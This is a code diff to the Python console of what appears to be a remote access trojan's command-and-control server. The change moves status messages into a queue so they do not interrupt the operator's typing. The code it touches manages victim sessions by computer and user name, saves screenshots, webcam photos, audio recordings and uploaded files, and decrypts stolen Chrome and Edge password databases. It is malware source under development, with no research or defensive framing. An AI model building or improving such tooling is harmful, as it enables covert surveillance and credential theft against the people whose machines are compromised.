@@ -132,6 +132,7 @@ class WebSocketServer:
         self.input_thread = None
         self.output_lock = threading.Lock()  # Lock for thread-safe output
         self.current_input_line = ""  # Track what user is typing
+        self.message_queue = queue.Queue()  # Queue for async messages (won't interrupt typing)
         
         # Live view state
         self.liveview_session = None
@@ -198,14 +199,27 @@ class WebSocketServer:
         self.http_server_thread.start()
     
     def async_print(self, message, end='\n'):
-        """Thread-safe print that doesn't break current input line"""
-        with self.output_lock:
-            # Clear the current line
-            sys.stdout.write('\r\033[K')
-            # Print the message
-            print(message, end=end)
-            # Reprint the prompt (don't auto-reprint - let caller decide)
-            sys.stdout.flush()
+        """Thread-safe print that doesn't break current input line - queues message for display"""
+        self.message_queue.put(message)
+    
+    def flush_messages(self):
+        """Print all queued messages - call this after user submits command"""
+        messages = []
+        while True:
+            try:
+                msg = self.message_queue.get_nowait()
+                messages.append(msg)
+            except queue.Empty:
+                break
+        if messages:
+            for msg in messages:
+                print(msg)
+    
+    def print_with_flush(self, prompt_func=None):
+        """Flush queued messages then print prompt"""
+        self.flush_messages()
+        if prompt_func:
+            print(prompt_func, end="", flush=True)
     
     def clear_screen(self):
         """Clear the terminal screen"""
@@ -391,8 +405,7 @@ class WebSocketServer:
                         pass
                     if sid in self.sessions:
                         del self.sessions[sid]
-                    with self.output_lock:
-                        print(f"\n\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
+                    self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
         
         self.sessions[session_id] = {
             'websocket': websocket,
@@ -412,15 +425,9 @@ class WebSocketServer:
         CYAN = '\033[96m'
         RESET = '\033[0m'
         
-        # Use async_print to avoid breaking user input
-        with self.output_lock:
-            sys.stdout.write('\r\033[K')  # Clear current line
-            print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
-            print(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
-            if self.active_session is None:
-                print(self.server_prompt(), end="", flush=True)
-            elif self.active_session:
-                print(self.session_prompt(self.active_session), end="", flush=True)
+        # Use message queue to avoid breaking user input
+        self.message_queue.put(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
+        self.message_queue.put(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
         
         try:
             async for message in websocket:
@@ -482,17 +489,10 @@ class WebSocketServer:
                                     del self.sessions[dup_sid]
                                 if self.active_session == dup_sid:
                                     self.active_session = None
-                                with self.output_lock:
-                                    print(f"\n\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same computer: {session['computer']})")
+                                self.message_queue.put(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same computer: {session['computer']})")
                             
                             os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
-                            with self.output_lock:
-                                sys.stdout.write('\r\033[K')  # Clear current line
-                                print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
-                                if self.active_session is None:
-                                    print(self.server_prompt(), end="", flush=True)
-                                elif self.active_session:
-                                    print(self.session_prompt(self.active_session), end="", flush=True)
+                            self.message_queue.put(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
                 except:
                     pass
                 
@@ -650,7 +650,7 @@ class WebSocketServer:
         except websockets.exceptions.ConnectionClosed:
             pass
         except Exception as e:
-            print(f"\033[91m[!]\033[0m Error: {e}")
+            self.message_queue.put(f"\033[91m[!]\033[0m Error: {e}")
         finally:
             was_active = (self.active_session == session_id)
             if session_id in self.sessions:
@@ -658,10 +658,9 @@ class WebSocketServer:
             if self.active_session == session_id:
                 self.active_session = None
             
-            print(f"\n\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
+            self.message_queue.put(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
             if was_active:
-                print("[!] You were interacting with this session - returned to server prompt")
-            print(self.server_prompt(), end="", flush=True)
+                self.message_queue.put("[!] You were interacting with this session - returned to server prompt")
     
     async def save_screenshot(self, session_id, data):
         """Save screenshot (handles base64 encoded data)"""
@@ -672,7 +671,7 @@ class WebSocketServer:
             
             if start == -1 or data_start == -1 or end == -1:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid screenshot format")
+                    self.message_queue.put("[!] Invalid screenshot format")
                 return
             
             header = data[start+22:data_start].decode('utf-8')
@@ -680,7 +679,7 @@ class WebSocketServer:
             
             if len(parts) < 3:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid header")
+                    self.message_queue.put("[!] Invalid header")
                 return
             
             width = int(parts[0])
@@ -699,7 +698,7 @@ class WebSocketServer:
                 pixel_data = base64.b64decode(b64_clean)
             except Exception as e:
                 if self.active_session == session_id:
-                    print(f"\n[!] Base64 decode error: {e}")
+                    self.message_queue.put(f"[!] Base64 decode error: {e}")
                 return
             
             if len(pixel_data) >= width * height * 3:
@@ -710,17 +709,14 @@ class WebSocketServer:
                 
                 image.save(filename)
                 if self.active_session == session_id:
-                    print(f"\n[+] Screenshot saved: {filename}")
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    self.message_queue.put(f"[+] Screenshot saved: {filename}")
             else:
                 if self.active_session == session_id:
-                    print(f"\n[!] Incomplete screenshot data ({len(pixel_data)} vs {width * height * 3})")
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    self.message_queue.put(f"[!] Incomplete screenshot data ({len(pixel_data)} vs {width * height * 3})")
                 
         except Exception as e:
             if self.active_session == session_id:
-                print(f"\n[!] Screenshot error: {e}")
-                print(self.session_prompt(session_id), end="", flush=True)
+                self.message_queue.put(f"[!] Screenshot error: {e}")
     
     async def handle_liveview_frame(self, session_id, session, data):
         """Handle live view frame data"""
@@ -1026,7 +1022,7 @@ class WebSocketServer:
             
             if start == -1 or data_start == -1 or end == -1:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid camshot format")
+                    self.message_queue.put("[!] Invalid camshot format")
                 return
             
             header = data[start+header_offset:data_start].decode('utf-8')
@@ -1034,7 +1030,7 @@ class WebSocketServer:
             
             if len(parts) < 3:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid camshot header")
+                    self.message_queue.put("[!] Invalid camshot header")
                 return
             
             width = int(parts[0])
@@ -1052,7 +1048,7 @@ class WebSocketServer:
                 pixel_data = base64.b64decode(b64_clean)
             except Exception as e:
                 if self.active_session == session_id:
-                    print(f"\n[!] Base64 decode error: {e}")
+                    self.message_queue.put(f"[!] Base64 decode error: {e}")
                 return
             
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -1064,16 +1060,14 @@ class WebSocketServer:
                 with open(filename, 'wb') as f:
                     f.write(pixel_data)
                 if self.active_session == session_id:
-                    print(f"\n[+] Webcam photo saved: {filename}")
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    self.message_queue.put(f"[+] Webcam photo saved: {filename}")
             # Check if it's PNG data
             elif pixel_data[:8] == b'\x89PNG\r\n\x1a\n':  # PNG magic bytes
                 filename += ".png"
                 with open(filename, 'wb') as f:
                     f.write(pixel_data)
                 if self.active_session == session_id:
-                    print(f"\n[+] Webcam photo saved: {filename}")
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    self.message_queue.put(f"[+] Webcam photo saved: {filename}")
             # Otherwise treat as raw RGB data (Windows)
             else:
                 filename += ".png"
@@ -1082,17 +1076,14 @@ class WebSocketServer:
                     image = Image.frombytes('RGB', (width, height), pixel_data[:width * height * 3])
                     image.save(filename)
                     if self.active_session == session_id:
-                        print(f"\n[+] Webcam photo saved: {filename}")
-                        print(self.session_prompt(session_id), end="", flush=True)
+                        self.message_queue.put(f"[+] Webcam photo saved: {filename}")
                 else:
                     if self.active_session == session_id:
-                        print(f"\n[!] Incomplete camshot data ({len(pixel_data)} vs {width * height * 3})")
-                        print(self.session_prompt(session_id), end="", flush=True)
+                        self.message_queue.put(f"[!] Incomplete camshot data ({len(pixel_data)} vs {width * height * 3})")
                 
         except Exception as e:
             if self.active_session == session_id:
-                print(f"\n[!] Camshot error: {e}")
-                print(self.session_prompt(session_id), end="", flush=True)
+                self.message_queue.put(f"[!] Camshot error: {e}")
     
     async def save_audio(self, session_id, data):
         """Save audio recording (handles base64 encoded WAV data)"""
@@ -1103,7 +1094,7 @@ class WebSocketServer:
             
             if start == -1 or data_start == -1 or end == -1:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid audio format")
+                    self.message_queue.put("[!] Invalid audio format")
                 return
             
             # Parse header: seconds|size
@@ -1112,7 +1103,7 @@ class WebSocketServer:
             
             if len(parts) < 2:
                 if self.active_session == session_id:
-                    print(f"\n[!] Invalid audio header")
+                    self.message_queue.put("[!] Invalid audio header")
                 return
             
             duration = int(parts[0])
@@ -1130,7 +1121,7 @@ class WebSocketServer:
                 wav_data = base64.b64decode(b64_clean)
             except Exception as e:
                 if self.active_session == session_id:
-                    print(f"\n[!] Audio base64 decode error: {e}")
+                    self.message_queue.put(f"[!] Audio base64 decode error: {e}")
                 return
             
             # Save WAV file
@@ -1141,13 +1132,11 @@ class WebSocketServer:
                 f.write(wav_data)
             
             if self.active_session == session_id:
-                print(f"\n[+] Audio recording saved: {filename} ({len(wav_data)} bytes, {duration}s)")
-                print(self.session_prompt(session_id), end="", flush=True)
+                self.message_queue.put(f"[+] Audio recording saved: {filename} ({len(wav_data)} bytes, {duration}s)")
                 
         except Exception as e:
             if self.active_session == session_id:
-                print(f"\n[!] Audio save error: {e}")
-                print(self.session_prompt(session_id), end="", flush=True)
+                self.message_queue.put(f"[!] Audio save error: {e}")
     
     async def handle_camview_frame(self, session_id, session, data):
         """Handle camera view frame data (RGB or JPEG)"""
@@ -1812,7 +1801,7 @@ class WebSocketServer:
                 f.write(file_data)
             
             if self.active_session == session_id:
-                print(f"\n[+] File saved: {save_path} ({len(file_data)} bytes)")
+                self.message_queue.put(f"[+] File saved: {save_path} ({len(file_data)} bytes)")
             
             # Track browser credential files for server-side decryption
             filename_lower = filename.lower()
@@ -1831,13 +1820,9 @@ class WebSocketServer:
             # Try to decrypt if we have both login db and local state for a browser
             await self.try_decrypt_browser_passwords(session_id)
             
-            if self.active_session == session_id:
-                print(self.session_prompt(session_id), end="", flush=True)
-            
         except Exception as e:
             if self.active_session == session_id:
-                print(f"\n[!] File save error: {e}")
-                print(self.session_prompt(session_id), end="", flush=True)
+                self.message_queue.put(f"[!] File save error: {e}")
     
     async def try_decrypt_browser_passwords(self, session_id):
         """Try to decrypt browser passwords if we have both required files"""
@@ -1857,14 +1842,14 @@ class WebSocketServer:
                 success, msg = decrypt_browser_database(login_path, state_path, output_path)
                 if success:
                     if self.active_session == session_id:
-                        print(f"\n{Colors.GREEN}[+] Chrome passwords decrypted: {output_path}{Colors.RESET}")
-                        print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.GREEN}[+] Chrome passwords decrypted: {output_path}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
                     # Clear so we don't re-decrypt
                     del creds['chrome_login']
                     del creds['chrome_state']
                 else:
                     if self.active_session == session_id:
-                        print(f"\n{Colors.YELLOW}[!] Chrome decrypt failed: {msg}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.YELLOW}[!] Chrome decrypt failed: {msg}{Colors.RESET}")
         
         # Try Edge
         if 'edge_login' in creds and 'edge_state' in creds:
@@ -1876,13 +1861,13 @@ class WebSocketServer:
                 success, msg = decrypt_browser_database(login_path, state_path, output_path)
                 if success:
                     if self.active_session == session_id:
-                        print(f"\n{Colors.GREEN}[+] Edge passwords decrypted: {output_path}{Colors.RESET}")
-                        print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.GREEN}[+] Edge passwords decrypted: {output_path}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
                     del creds['edge_login']
                     del creds['edge_state']
                 else:
                     if self.active_session == session_id:
-                        print(f"\n{Colors.YELLOW}[!] Edge decrypt failed: {msg}{Colors.RESET}")
+                        self.message_queue.put(f"{Colors.YELLOW}[!] Edge decrypt failed: {msg}{Colors.RESET}")
 
     async def send_command(self, session_id, command):
         """Send command to session"""
@@ -1960,9 +1945,8 @@ class WebSocketServer:
             while self.running:
                 # Check if session still exists (removed when connection closes)
                 if session_id not in self.sessions:
-                    with self.output_lock:
-                        sys.stdout.write('\r\033[K')
-                        print("\n[!] Session closed - returning to server prompt")
+                    self.flush_messages()
+                    print("\n[!] Session closed - returning to server prompt")
                     break
                 
                 try:
@@ -1972,6 +1956,9 @@ class WebSocketServer:
                     except queue.Empty:
                         await asyncio.sleep(0.05)
                         continue
+                    
+                    # Flush any queued messages before processing command
+                    self.flush_messages()
                     
                     # Double-check session still valid before processing command
                     if session_id not in self.sessions:
@@ -1985,6 +1972,7 @@ class WebSocketServer:
                         break
                     
                     if cmd == '':
+                        self.flush_messages()
                         print(self.session_prompt(session_id), end="", flush=True)
                         continue
                     
@@ -1992,16 +1980,20 @@ class WebSocketServer:
                     if cmd.startswith('upload '):
                         filepath = cmd[7:].strip()
                         await self.upload_file(session_id, filepath)
+                        self.flush_messages()
+                        print(self.session_prompt(session_id), end="", flush=True)
                         continue
                     
                     if cmd in ['clear', 'cls']:
                         self.clear_screen()
+                        self.flush_messages()
                         print(f"[*] Session {session_id} active")
                         print(self.session_prompt(session_id), end="", flush=True)
                         continue
                     
                     if cmd == 'help':
                         self.print_session_help(session_id)
+                        self.flush_messages()
                         print(self.session_prompt(session_id), end="", flush=True)
                         continue
                     
@@ -2009,6 +2001,11 @@ class WebSocketServer:
                     if not await self.send_command(session_id, cmd):
                         print(f"\n[!] Failed to send command")
                         break
+                    
+                    # Wait briefly for command response then show prompt
+                    await asyncio.sleep(0.3)
+                    self.flush_messages()
+                    print(self.session_prompt(session_id), end="", flush=True)
                     
                 except KeyboardInterrupt:
                     print(f"\n\n[*] Backgrounding session {session_id}\n")
@@ -2095,6 +2092,7 @@ class WebSocketServer:
     async def command_loop(self):
         """Handle server commands"""
         self.start_input_thread()
+        self.flush_messages()
         print(self.server_prompt(), end="", flush=True)
         
         while self.running:
@@ -2106,9 +2104,13 @@ class WebSocketServer:
                     await asyncio.sleep(0.05)
                     continue
                 
+                # Flush any queued messages before processing command
+                self.flush_messages()
+                
                 cmd = cmd.strip()
                 
                 if not cmd:
+                    self.flush_messages()
                     print(self.server_prompt(), end="", flush=True)
                     continue
                 
@@ -2162,13 +2164,16 @@ class WebSocketServer:
                     print(f"[!] Unknown command: {cmd}")
                     print("Type 'help' for available commands")
                 
+                self.flush_messages()
                 print(self.server_prompt(), end="", flush=True)
                 
             except KeyboardInterrupt:
                 print("\n\n[*] Use 'exit' to shut down")
+                self.flush_messages()
                 print(self.server_prompt(), end="", flush=True)
             except Exception as e:
                 print(f"[!] Error: {e}")
+                self.flush_messages()
                 print(self.server_prompt(), end="", flush=True)
     
     def print_banner(self):
